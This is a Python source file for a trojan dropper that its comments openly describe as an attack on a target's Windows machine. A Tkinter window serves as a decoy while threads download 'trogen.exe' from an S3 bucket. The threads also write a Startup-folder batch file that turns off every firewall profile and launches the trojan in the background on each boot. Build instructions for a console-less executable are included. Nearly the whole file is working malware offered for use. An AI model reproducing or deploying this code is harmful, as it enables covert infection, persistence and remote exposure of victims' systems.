import tkinter as tk
import threading
import boto3
import os

'''
# This is a fake program which we present to the target.
# When the user runs the program the application will create a .bat file to the start up folder
# and copy the trogen to a different location.
# Now on each windows start, the bat file will be executed and the trogen will be executed in background - this exposed the system to the host
'''
def open_fake_program():
    window = tk.Tk()
    window.title("Aravind R Pillai")
    window.geometry("300x200")
    label = tk.Label(window, text="This is fake program to load the actual files to the guest system")
    label.pack()
    button = tk.Button(window, text="Click Me")
    button.pack()
    window.mainloop()

'''
#Function to copy the trogen file to the host machine
    # 1. Create the exe file of "trogen.py" and place it in a shared location (eg: aws s3) 
    # 2. Code below downloads that .exe file from s3 and save it to a location on the guest machine
    # 3. Done 
    # To create exe file --> pyinstaller --onefile --noconsole trogen.py  (after -> pip install pyinstaller )
'''
def copy_trogen_to_disk():
    s3 = boto3.client('s3')
    s3.download_file("trogen_bucket", "trogen.exe", "C:/tmp/trogen.exe")

'''
# Function to create the start up file 
# This spins up the trogen on windows start 
'''    
def create_startup_file():
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "trogen_startup.bat")
    try:
        with open(startup_folder, 'w') as file:
            file.write("@echo off \n")
            file.write("netsh advfirewall set allprofiles state off \n")
            file.write("start /B C:/tmp/trogen.exe")
        print("Content successfully written to the file. : {}".format(startup_folder))
    except IOError:
        print("Error: Unable to write to the file.")


if __name__ == '__main__':  
    copy_trogen_to_disk_thread = threading.Thread(target=copy_trogen_to_disk, args=())
    create_startup_file_thread = threading.Thread(target=create_startup_file, args=())
    open_fake_program_thread = threading.Thread(target=open_fake_program, args=())
    
    copy_trogen_to_disk_thread.start()
    create_startup_file_thread.start()
    open_fake_program_thread.start()





